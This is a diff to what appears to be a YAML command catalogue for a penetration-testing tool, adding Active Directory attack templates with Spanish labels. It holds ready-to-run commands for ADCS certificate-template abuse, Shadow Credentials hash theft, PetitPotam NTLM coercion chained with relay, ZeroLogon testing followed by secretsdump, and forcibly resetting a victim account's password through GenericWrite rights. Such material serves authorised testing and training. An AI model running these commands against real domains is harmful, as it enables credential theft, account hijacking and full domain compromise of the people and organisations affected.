@@ -301,3 +301,119 @@ tools:
         label: "Nombre del equipo"
         placeholder: "WORKSTATION01"
     tags: [ad, laps, local-admin, password, enumeration]
+
+  # ─────────────────────────────────────────────
+  # MODERN AD ATTACKS (2022-2024)
+  # ─────────────────────────────────────────────
+
+  - id: certipy_find_esc
+    name: "Certipy - ADCS ESC1-8 Find"
+    description: "Busca plantillas vulnerables de ADCS (ESC1-ESC8)"
+    command: "certipy-ad find -u '{user}@{domain}' -p '{password}' -dc-ip {dc_ip} -stdout 2>/dev/null | grep -A5 'ESC[1-8]\\|Vulnerable\\|Enabled.*Client Auth'"
+    params:
+      - name: user
+        label: "Usuario"
+        placeholder: "user1"
+        required: true
+      - name: domain
+        label: "Dominio"
+        placeholder: "CORP.local"
+        required: true
+      - name: password
+        label: "Contrasena"
+        placeholder: "Password123"
+        required: true
+      - name: dc_ip
+        label: "IP del DC"
+        placeholder: "192.168.1.10"
+        required: true
+    tags: [adcs, certipy, esc1, certificates, ad]
+    notes: "ESC1: plantilla con Client Auth + enrollee supplies Subject. Exploit: certipy-ad req -template TEMPLATE -upn administrator@domain"
+
+  - id: shadow_credentials
+    name: "Shadow Credentials (certipy shadow)"
+    description: "Obtiene NT hash via msDS-KeyCredentialLink sin necesitar ADCS"
+    command: "certipy-ad shadow auto -u '{user}@{domain}' -p '{password}' -account '{target_account}' -dc-ip {dc_ip} 2>/dev/null"
+    params:
+      - name: user
+        label: "Usuario con GenericWrite"
+        placeholder: "user1"
+        required: true
+      - name: domain
+        label: "Dominio"
+        placeholder: "CORP.local"
+        required: true
+      - name: password
+        label: "Contrasena"
+        placeholder: "Password123"
+        required: true
+      - name: target_account
+        label: "Cuenta objetivo"
+        placeholder: "DC01$"
+        required: true
+      - name: dc_ip
+        label: "IP del DC"
+        placeholder: "192.168.1.10"
+        required: true
+    tags: [shadow-credentials, certipy, pkinit, ad, 2022]
+    notes: "Requiere GenericWrite. Excelente contra cuentas de maquina (combo con RBCD)."
+
+  - id: petitpotam_coercion
+    name: "PetitPotam - Coercion NTLM via EFS"
+    description: "Fuerza al DC a autenticarse via EFS API (NTLM relay)"
+    command: "python3 /opt/PetitPotam/PetitPotam.py {lhost} {dc_ip} 2>/dev/null"
+    params:
+      - name: lhost
+        label: "IP del atacante"
+        placeholder: "10.10.14.1"
+        required: true
+      - name: dc_ip
+        label: "IP del DC"
+        placeholder: "192.168.1.10"
+        required: true
+    tags: [petitpotam, coercion, ntlm-relay, ad, forced-auth]
+    notes: "Combinar con ntlmrelayx -t ldaps://DC --delegate-access para RBCD attack. CVE-2021-36942."
+
+  - id: zerologon_check
+    name: "ZeroLogon CVE-2020-1472 Check"
+    description: "Verifica si el DC es vulnerable a ZeroLogon"
+    command: "crackmapexec smb {dc_ip} -u '' -p '' --zerologon 2>/dev/null || python3 /opt/impacket/examples/zerologon_tester.py {dc_name} {dc_ip} 2>/dev/null"
+    params:
+      - name: dc_ip
+        label: "IP del DC"
+        placeholder: "192.168.1.10"
+        required: true
+      - name: dc_name
+        label: "Nombre NetBIOS del DC"
+        placeholder: "DC01"
+        required: true
+    tags: [zerologon, cve-2020-1472, ad, critical, netlogon]
+    notes: "PELIGROSO en prod. Si vulnerable: impacket-secretsdump DOMAIN/DC01$@DC_IP -no-pass"
+
+  - id: dacl_abuse_genericwrite
+    name: "DACL Abuse - GenericWrite Reset Password"
+    description: "Resetea contrasena de una cuenta via GenericWrite sobre el objeto"
+    command: "# Con impacket (rpcclient):\nrpcclient -U '{domain}/{user}%{password}' {dc_ip} -c \"setuserinfo2 {target_user} 23 'NewP@ssw0rd1'\" 2>/dev/null\n# Verificar nuevo acceso:\ncrackmapexec smb {dc_ip} -u '{target_user}' -p 'NewP@ssw0rd1' 2>/dev/null"
+    params:
+      - name: domain
+        label: "Dominio"
+        placeholder: "CORP"
+        required: true
+      - name: user
+        label: "Usuario atacante"
+        placeholder: "user1"
+        required: true
+      - name: password
+        label: "Contrasena atacante"
+        placeholder: "Password123"
+        required: true
+      - name: dc_ip
+        label: "IP del DC"
+        placeholder: "192.168.1.10"
+        required: true
+      - name: target_user
+        label: "Usuario objetivo"
+        placeholder: "victima"
+        required: true
+    tags: [dacl, genericwrite, password-reset, ad, acl-abuse]
+    notes: "Requiere GenericWrite o ForceChangePassword sobre la cuenta. PowerView: Set-DomainUserPassword -Identity victima -AccountPassword (ConvertTo-SecureString 'Pass' -AsPlainText -Force)"
